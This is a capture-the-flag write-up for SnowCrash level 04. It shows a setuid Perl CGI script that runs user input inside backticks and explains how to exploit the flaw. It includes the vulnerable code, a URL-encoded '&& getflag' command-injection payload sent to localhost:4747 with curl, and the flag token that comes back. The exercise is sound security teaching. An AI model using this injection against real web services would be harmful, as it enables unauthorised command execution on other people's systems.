## Level 04

Getting started with level 04 you we are greeted with a perl file:

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

That contains the following script:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Solution

The script makes use of backticks, which in perl execute an external system command and capture its output.
The vulnerability of the script is that within these backticks it expands a variable, one that we as the user provide!
Since no input sanitization is done we can exploit this by running any command we want, if we provide the right input.

We can simply append a `&&` to chain second command after echo is called, in our case the `getflag` command.

Since we can see `localhost:4747` on the top of the script we can go off the assumption that there is a webserver running with port 4747 opened.

The script requires the variable `x` to be set, since we are having to request it from a webserver we need to set the variable within the request. This is done by adding a question mark after the url `http://localhost:4747/?x=`.

Finally there is one thing left, the request needs to be URL-encoded.
We are going to try to send the string `Running getflag: && getflag` to the webserver, if we pass this through a URL-encoder we get the string `Running%20getflag%3A%20%26%26%20getflag`.

Combining all the knowledge we have gathered so far and utilizing `curl` to send our request we get our token!

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/?x=Running%20getflag%3A%20%26%26%20getflag"
Running getflag:
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
